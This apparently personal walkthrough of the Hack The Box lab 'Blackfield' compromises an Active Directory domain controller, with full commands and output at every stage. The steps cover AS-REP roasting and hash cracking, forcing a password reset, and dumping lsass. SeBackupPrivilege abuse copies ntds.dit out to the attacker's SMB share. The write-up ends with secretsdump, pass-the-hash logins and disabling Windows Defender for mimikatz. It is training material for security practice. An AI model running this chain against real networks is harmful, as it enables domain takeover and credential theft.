# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
```bash
nmap -sV -sC -vv 10.10.10.192
nmap -sU --top-ports=10 -vv 10.10.10.192

---OUTPUT-TCP---
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-18 06:55:37Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48702/tcp): CLEAN (Timeout)
|   Check 2 (port 3186/tcp): CLEAN (Timeout)
|   Check 3 (port 53637/udp): CLEAN (Timeout)
|   Check 4 (port 46953/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-04-18T06:55:40
|_  start_date: N/A
|_clock-skew: 7h01m20s

---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
53/udp   open          domain       udp-response ttl 127

```
## SMB Enumeration
- We pass the commands:
```bash
smbclient -U 'guest' -L //10.10.10.192 --password=''

---OUTPUT---
Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
```
- forensic access is denied
- we check profiles$ and see a list of (possible usernames?) as empty directories
```bash
smbclient -U 'guest' --password='' //10.10.10.192/profiles$
smb:> dir

---OUTPUT---
  AAlleni                             D        0  Wed Jun  3 12
  ABarteski                           D        0  Wed Jun  3 12
  ABekesz                             D        0  Wed Jun  3 12

.
.
.
  ZScozzari                           D        0  Wed Jun  3 12
  ZTimofeeff                          D        0  Wed Jun  3 12
  ZWausik                             D        0  Wed Jun  3 12

```
- I save it to a file and clean it out just for users:
```bash
vi smb # copy output here
cat smb | awk print '{print $1}' > smbusers.txt
```
- Also via smb these commands hit:
```bash
crackmapexec smb 10.10.10.192 -u '' -p ''
crackmapexec smb 10.10.10.192 -u 'guest' -p ''
crackmapexec smb 10.10.10.192 -u 'anonymous' -p 'anonymous'
crackmapexec smb 10.10.10.192 -u 'test' -p 'test'
crackmapexec smb 10.10.10.192 -u 'test' -p ''
crackmapexec smb 10.10.10.192 -u 'anonymous' -p ''
```
- We should make sure about the target's password policy to make sure we don't get locked out :
```bash
ldapsearch -x -D 'BLACKFIELD\support' -w '#00^BlackKnight' -H ldap://10.10.10.192 -b "dc=blackfield,dc=local" -s sub "*" | grep lockoutThreshold

---OR-WITH-PORT---
ldapsearch -x -D 'BLACKFIELD\support' -w '#00^BlackKnight' -H ldap://10.10.10.192:389 -b "dc=blackfield,dc=local" -s sub "*" | grep lockoutThreshold

---OUTPUT---
lockoutThreshold: 0
lockoutThreshold: 0
```
- No threshold so e can bruteforce as many times as we want (but there will be noise ofcourse)
- We try to enumerate for usernames using kerbrute.
```bash
./kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d blackfield.local /home/kali/Downloads/Windows/Blackfield/smbusers.txt

---OUTPUT---

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/18/25 - Ronnie Flathers @ropnop

2025/04/18 05:59:12 >  Using KDC(s):
2025/04/18 05:59:12 >   10.10.10.192:88

2025/04/18 05:59:33 >  [+] VALID USERNAME:       audit2020@blackfield.local
2025/04/18 06:01:24 >  [+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:361c993803d6afc414dc262d6ae20e4f$831fbfcfa830f65ab19972d856ab3c4a5df6c12bf865deac29b99954ee39e21a3e083f7de536a3ad78f4b945bb2dda5e4b47bb35612776329f64e642dc79f91bad89762f6cf1a38fdbd3e2968306f3b6231951ecc5c19dd3bd53f3e7e16819a884466eda338e0c7ca1fb899ad64e0e3453f8e94820bb78d8c97579a48d2255204dc9c4754f8ac941820671cd35574a6b6928e6b1afd25f1a632d007e1b22b416c84bc4e66757917a8b4caf955452362421dd3a38dc0dcb76a7fb0c041fabc0415d0078c70dee17977f549c787f62d69aea9740405b0072b10d543b13402d04da7ba077e02c6c732baf2e8806fbabc5a7fc72bddf47fbe26735667d17f9c3ede10ba5f6195e09436d                  
2025/04/18 06:01:24 >  [+] VALID USERNAME:       support@blackfield.local
2025/04/18 06:01:29 >  [+] VALID USERNAME:       svc_backup@blackfield.local
2025/04/18 06:01:54 >  Done! Tested 314 usernames (3 valid) in 161.922 seconds
```
- If there are many we can also grep the out file to just show valid username.
```bash
grep VALID kerbrute.userenum.out | awk '{print $7}'
grep VALID kerbrute.userenum.out | awk '{print $7}' | awk -F\@ '{print $1}' > userlistkrb
grep VALID kerbrute.userenum.out | awk '{print $7}' | awk -F\@ '{print $2"\\"$1}' > dom_user.lst
```
- We find some users and a hash. support has pre-authentication disabled
- Attempting to crack the hash:
```bash
vi support.hash # copy hash here
john support.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
- We don't get anything
- On searching google "no pre auth kereberos exploit" or simply "krb5asrep" we find when pre auth is disabled we can do something called ASREP Roasting : https://www.thehacker.recipes/ad/movement/kerberos/asreproast
- I try with this method:
```bash
impacket-GetNPUsers -usersfile validusers -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.10.192 'blackfield.local/'

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:c49e5214c75e0435e5e18af4b6f8e148$eb3d7a655747d33c72c06e1737577687865650f8864ddd4764f73ed529f33f7f559e7967edb333afd1d8ecd2b6d652fb746a7d3bcef33852692259d79a6f969045061f3803984dc8c37e65f4f69845497130e65b19f20369f781feafb4d4bf9d2b1d308842abe2cb0d11dd2d816c58878a3d184268e39b1c38d942804ad4f4182f2b9ce8f82445eddc1abb7241ab545e824c7ca248ae349cde20f9b5e550f45912526ac25b8a0626da6e6ced0b8595e8d6091ff4a617bdf645a7d387cf4135944ce662b11a12c7d8af82b48999456bfa3cee2de8f34e8c607a3f8611f3d5c70804e3d0bacde3587630101e93f2696335eaf784e2
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```
- Same output but we try to crack this hash:
```bash
rm support.hash
vi support.hash # copy hash here
john support.hash --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
```
- We crack it. Possibly due to the format argument in GetNPUsers command
- We test credentials (fails with winre) and get a hit:
```bash
crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'

---OUTPUT---
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
```
- We try login to the forensic share directory with this credentials but we don't have permissions to read it:
```bash
smbclient -U 'support' //10.10.10.192/forensic --password='#00^BlackKnight' 
smb: \> dir

---OUTPUT---
NT_STATUS_ACCESS_DENIED listing \*

```
## BloodHound
- We get some files via BloodHound for analysis
```bash
bloodhound-python --dns-tcp -ns 10.10.10.192 -d blackfield.local -u 'support' -p '#00^BlackKnight' -c all
```
- I marrk Adminsitrator and  SVC_backup as high value targets after clicking "Shortest Path to High Value Targets" and "Shortest Path to Domain Admin"
- I then search for our owned user support and mark it as owned
- I then check First Degree Object Control under Outbound Object Control and find that support can change the password of audit2020 user
- I use netrpc. First two times I fail but identify password complexity
```bash
net rpc password "audit2020" "rocknrj2025" -U "blackfield.local"/"support"%"#00^BlackKnight" -S "blackfield.local"

---OUTPUT---
Failed to set password for 'audit2020' with error: Unable to update the password. The value provided for the new password does not meet the length, complexity, or history requirements of the domain..
---

net rpc password "audit2020" "rocknrjpwnd2025" -U "blackfield.local"/"support"%"#00^BlackKnight" -S "blackfield.local"

---OUTPUT---
Failed to set password for 'audit2020' with error: Unable to update the password. The value provided for the new password does not meet the length, complexity, or history requirements of the domain..
```
- Finally I get it to work with the correct password complexity
```bash
net rpc password "audit2020" "rocknrjpwnd2025@" -U "blackfield.local"/"support"%"#00^BlackKnight" -S "blackfield.local"
```
- We check with crackmapexec (fails for winre again)
```bash
crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'rocknrjpwnd2025@'

---OUTPUT---
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:rocknrjpwnd2025@
```
- We access forensic share with these credentials:
```bash
smbclient -U 'audit2020' //10.10.10.192/forensic --password='rocknrjpwnd2025@'
smb:> dir
---OUTPUT---
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020
```
- In command output we pull some files:
- domain_admins.txt
- domain_users.txt
- domain_groups.txt
- firewall_rules.txt
- ipconfig.txt
- netstat.txt
- systeminfo.txt
- route.txt
- tasklist.txt
- lsass.zip
- svchost.zip
- WmiPrivSe.zip
- For domain_admins file we see two domains:
- Administrator
- Ipwn3dYourCompany
- I unzipped lsass.zip and used pypykatz to read:
```bash
unzip lsass.zip
pypykatz lsass minidump ./lsass.DMP

---OUTPUT---
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
        == WDIGEST [633ba]==
                username svc_backup

```
- Can winrm with these creds for user flag
- We also find an Administrator hash but it doesn't work:
```bash
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
                DPAPI: 240339f898b6ac4ce3f34702e4a8955000000000
```
## Privilege Escalation (Method 1 via diskshadow)
- We check whoami /priv and find some privileges to check
- If we remember Jeevs lab we can check vulnerable privs here :
- https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
- SeBackupPrivilege is vulnerble
```bash
whoami /priv

---OUTPUT---
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
- I find this link to exploit:
- https://github.com/k4sth4/SeBackupPrivilege
- I download the modules and create the vss.dsh file
```bash
cat vss.dsh

---OUTPUT---
set context persistent nowriters
set metadata c:\\programdata\\test.cab        
set verbose on
add volume c: alias test
create
expose %test% z:
```
- I create a folder temp in C: and upload the files
```powershell
mkdir C:\temp
cd C:\temp
upload vss.dsh
upload SeBackupPrivilegeCmdLets.dll
upload SeBackupPrivilegeUtils.dll
```
- Then i pass the exploit commands improting the module and creating a shadow disk with diskshadow command:
```bash
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
diskshadow /s vss.dsh

---OUTPUT---
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  4/18/2025 1:05:45 PM

-> set context persistent nowriters
-> set metadata c:\\programdata\\test.cab
-> set verbose on
-> add volume c: alias test
-> create

Alias test for shadow ID {196595c8-07ab-4794-b84f-e8bdbf78270a} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {25260901-98fa-4d7a-8743-56a6c6b63d15} set as environment variable.
Inserted file Manifest.xml into .cab file test.cab
Inserted file DisF6AA.tmp into .cab file test.cab

Querying all shadow copies with the shadow copy set ID {25260901-98fa-4d7a-8743-56a6c6b63d15}

        * Shadow copy ID = {196595c8-07ab-4794-b84f-e8bdbf78270a}               %test%
                - Shadow copy set: {25260901-98fa-4d7a-8743-56a6c6b63d15}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 4/18/2025 1:05:46 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %test% z:
-> %test% = {196595c8-07ab-4794-b84f-e8bdbf78270a}
The shadow copy was successfully exposed as z:\.
```
- Then i copy the ntds and system files to temp
- Why ntds and system files? NTDS holds the AD database while system holds the bootkey to access this database
```bash
Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\temp\\ntds.dit
reg save HKLM\SYSTEM C:\\temp\\SYSTEM
download ntds.dit
download SYSTEM
```

## Alternate (maybe intended route?) method
- We can also use robocopy to copy the contents of Administrator desktop.
```bash
robocopy /b C:\\users\\administrator\\desktop C:\\temp

---OUTPUT---
-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, April 18, 2025 1:30:02 PM
   Source : C:\users\administrator\desktop\
     Dest : C:\temp\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           3    C:\users\administrator\desktop\
          *EXTRA File             18.0 m        ntds.dit
          *EXTRA File              45056        sam.hive
          *EXTRA File              12288        SeBackupPrivilegeCmdLets.dll
          *EXTRA File              16384        SeBackupPrivilegeUtils.dll
          *EXTRA File             16.7 m        SYSTEM
          *EXTRA File              45056        system.hive
          *EXTRA File                150        vss.dsh
            New File                 282        desktop.ini
  0%
100%
            New File                 447        notes.txt
  0%
100%
            New File                  32        root.txt
2025/04/18 13:30:02 ERROR 5 (0x00000005) Copying File C:\users\administrator\desktop\root.txt
Access is denied.
```
- We are unable to grab the root.txt file.
- We read notes.txt
- nothing much of value
- We can use wbadmin to exploit:
- we create an smb user and passwd
```bash
adduser rocknrj
smbpasswd -a rocknrj
> rocknrj
```
- We create the smb share folder
```bash
mkdir /tmp/blackfield
chmod 755 /tmp/blackfield
chown rocknrj:rocknrj /tmp/blackfield
```
- First we need to create an smb share:
- We edit smb.conf
```bash
sudo vi /etc/samba/smb.conf

---TEXT-TO-COPY---
[smb]
comment = Samba
path = /tmp/
guest ok = yes
read only = no
browsable = yes
force user = smbuser

--------
-or maybe create me smb.conf and copy-
[global]
map to guest = Bad User
server role = standalone server
usershare allow guests = yes
idmap config * : backend = tdb
interfaces = tun0
smb ports = 445
[smb]
comment = Samba
path = /tmp/
guest ok = yes
read only = no
browsable = yes
force user = smbuser
```
- restart smb server
```bash
sudo service smbd restart
```
- We mount smb server on our target:
```bash
net use x: \\10.10.14.25\smb /user:rocknrj rocknrj
cd X:\
```
- We pass the wbadmin command to create a backup
```bash
echo "Y" | wbadmin start backup -backuptarget:\\10.10.14.25\smb -include:c:\windows\ntds

---OUTPUT---
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.


Note: The backed up data cannot be securely protected at this destination.
Backups stored on a remote shared folder might be accessible by other
people on the network. You should only save your backups to a location
where you trust the other users who have access to the location or on a
network that has additional security precautions in place.

Retrieving volume information...
This will back up (C:) (Selected Files) to \\10.10.14.25\smb.
Do you want to start the backup operation?
[Y] Yes [N] No Y

The backup operation to \\10.10.14.25\smb is starting.
Creating a shadow copy of the volumes specified for backup...
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Scanning the file system...
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Found (12) files.
Scanning the file system...
Found (12) files.
Creating a backup of volume (C:), copied (100%).
Creating a backup of volume (C:), copied (100%).
Summary of the backup operation:
------------------

The backup operation successfully completed.
The backup of volume (C:) completed successfully.
Log of files successfully backed up:
C:\Windows\Logs\WindowsServerBackup\Backup-18-04-2025_22-12-33.log
```
- Then we restore the backup
```bash
wbadmin get version

---OUTPUT---
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Backup time: 9/21/2020 4:00 PM
Backup location: Network Share labeled \\10.10.14.4\blackfieldA
Version identifier: 09/21/2020-23:00
Can recover: Volume(s), File(s)

Backup time: 4/18/2025 3:12 PM
Backup location: Network Share labeled \\10.10.14.25\smb
Version identifier: 04/18/2025-22:12
Can recover: Volume(s), File(s)
```
- Then we start recovery with the backup version we created without acl
```bash
echo "Y" | wbadmin start recovery -version:04/18/2025-22:12 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl

---OUTPUT---
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Retrieving volume information...
You have chosen to recover the file(s) c:\windows\ntds\ntds.dit from the
backup created on 4/18/2025 3:12 PM to C:\.
Preparing to recover files...

Do you want to continue?
[Y] Yes [N] No Y

Running the recovery operation for c:\windows\ntds\ntds.dit, copied (48%).
Currently recovering c:\windows\ntds\ntds.dit.
Successfully recovered c:\windows\ntds\ntds.dit to C:\.
The recovery operation completed.
Summary of the recovery operation:
--------------------

Recovery of c:\windows\ntds\ntds.dit to C:\ successfully completed.
Total bytes recovered: 18.00 MB
Total files recovered: 1
Total files failed: 0

Log of files successfully recovered:
C:\Windows\Logs\WindowsServerBackup\FileRestore-18-04-2025_22-16-10.log
```
- then we save the registry system.hive as it holds the boot key to access the AD database held in ntds.dit
```bash
reg save HKLM\SYSTEM C:\system.hive

---OUTPUT---
The operation completed successfully.
```
- Finally we download the ntds.dit and system.hive files
```bash
cd C:\
download ntds.dit
download system.hive
```
## Priv Esc final step
- Finally whichever way we used, we grab the ntds.dit file and `system.hive` OR `system` file and crack it to retrieve the hashes of the users using secretsdump
```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL

---RELEVANT-OUTPUT---
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::

```
- if you use -history argument you will find old pwds of admin:
```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL -history

---RELEVANT-OUTPUT---
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Administrator_history0:500:aad3b435b51404eeaad3b435b51404ee:7f1e4ff8c6a8e6b6fcae2d9c0572cd62:::
Administrator_history1:500:aad3b435b51404eeaad3b435b51404ee:ac2983b6afa7bdea9360fa7a95e31855:::
Administrator_history2:500:aad3b435b51404eeaad3b435b51404ee:a47feb765cf90d3216423e9cfedea565:::
Administrator_history3:500:aad3b435b51404eeaad3b435b51404ee:24958cffdd2aa3125c63c3fd374db44b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```
- we saw the older admin hash (second line)
- We use this hash to login via evil-winrm (psexec doesn't seem to work)
```bash
evil-winrm -u administrator -H '184fb5e5178480be64824d4cd53b99ee' -i  10.10.10.192
```
- for psexec in Ippsec video, we see it works but we login as nt authority/system which if we check the notes.txt it says root flag is encrypted and to use nominal domain admins (i.e not generic ones but user given)
- If we pass this command:
```bash
cipher /c C:\Users\Adminsitrator\Desktop\root.txt
```
- We would see only Administrator can decrypt but we are system
- wmiexec won't drop us to system
- And we can grab the root flag

-------
--------
## Extra
- Can also try mimikatz but there is AV
- To disable AV
- cd C:|Progra~1\Windows Defender
```bash
.\mpcmdrun.exe -RemoveDefinitions -All
```
- Upload mimikatz
- Add to SMB share
- on windows goto the directory (X: for us)
- can change pwd with (using old hash of audit from -history in impackets secretdump command):
```bash
.\mimikatz.exe 
> lsadump::setntlm /user:audit2020 /ntlm:600a406c2c1f2062eb9bb227bad654aa
```
---
- Suppose in the `profiles$` smb share there was some data in the directories. It would be too hard to enumerate via smb.
- We can add a mount folder and copy the contents there (make sure you don't have anything important mounted on mnt if using these commands)
```bash
sudo unmount /mnt # incase something was mounted there
sudo mount -t cifs'//10.10.10.192/profiles$' /mnt
```
- Then we can use the find command to enumerate to see if anything is in these directories
```bash
cd /mnt
find .
```
---
- Ippsec didn't use -format in getnpusers command and still got the right hash
- furthermore his kerbrute command didn't give any hash
- Also I saw another share listed so it may have been due to some edits made by another user?
----
- Force changing password is noisy and they will know you changed it
- make notes before you do it and
- set pwd back after priv esc/admin
- Actual command in rpcclient is:
```bash
rpcclient -U support 10.10.10.192
> <support-pwd>
> setuserinfo2 audit2020 23 'rocknrjpwnd2025'
```
- can check windows documentation as to why 23 but basically it allows us to write pwd without encryption